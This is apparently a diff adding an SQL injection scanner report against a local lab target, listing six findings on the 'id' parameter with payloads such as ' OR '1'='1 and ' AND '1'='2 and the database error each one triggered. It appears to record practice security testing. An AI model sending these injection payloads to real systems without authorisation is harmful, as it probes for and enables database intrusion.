@@ -1,0 +1,47 @@
+SQL INJECTION SCANNER REPORT
+============================================================
+Scan time: 2026-09-18 06:20:25
+============================================================
+
+Finding 1
+------------------------------------------------------------
+URL: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%22&Submit=Submit
+Parameter: id
+Payload: "
+Indicators: mysql
+
+Finding 2
+------------------------------------------------------------
+URL: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27&Submit=Submit
+Parameter: id
+Payload: '
+Indicators: sql syntax
+
+Finding 3
+------------------------------------------------------------
+URL: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
+Parameter: id
+Payload: ' OR '1'='1
+Indicators: mysql
+
+Finding 4
+------------------------------------------------------------
+URL: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%22+OR+%221%22%3D%221&Submit=Submit
+Parameter: id
+Payload: " OR "1"="1
+Indicators: mysql
+
+Finding 5
+------------------------------------------------------------
+URL: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit
+Parameter: id
+Payload: ' AND '1'='2
+Indicators: mysql
+
+Finding 6
+------------------------------------------------------------
+URL: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1%22+AND+%221%22%3D%222&Submit=Submit
+Parameter: id
+Payload: " AND "1"="2
+Indicators: mysql
+
